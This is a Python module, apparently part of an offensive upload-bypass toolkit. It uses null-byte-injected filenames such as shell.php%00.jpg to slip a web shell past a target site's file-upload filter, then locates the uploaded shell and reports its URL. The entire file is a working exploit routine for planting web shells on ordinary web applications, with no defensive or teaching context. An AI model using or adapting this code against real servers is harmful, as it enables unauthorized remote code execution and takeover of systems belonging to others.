"""Null byte injection bypass technique"""

from ..utils.name_generator import generate_shell_name

def attempt_null_byte(request_handler, file_finder, upload_url, shell_content):
    """
    Bypass using null byte injection (shell.php%00.jpg)
    """
    print("[*] Attempting null byte injection...")
    
    filenames = [
        f"{generate_shell_name()}.php%00.jpg",
        f"{generate_shell_name()}.php\x00.jpg",
        f"{generate_shell_name()}.aspx%00.jpg"
    ]
    
    for filename in filenames:
        files = {
            'file': (filename, shell_content, 'image/jpeg')
        }
        
        response = request_handler.post(upload_url, files=files)
        
        if response and response.status_code == 200:
            # Null byte might be truncated, check for .php file
            truncated_name = filename.split('%00')[0].split('\x00')[0]
            shell_url = file_finder.find_uploaded_file(truncated_name, response)
            if shell_url:
                print(f"    [+] SUCCESS! Null byte worked: {shell_url}")
                return shell_url
    
    print("    [-] Null byte injection failed")
    return None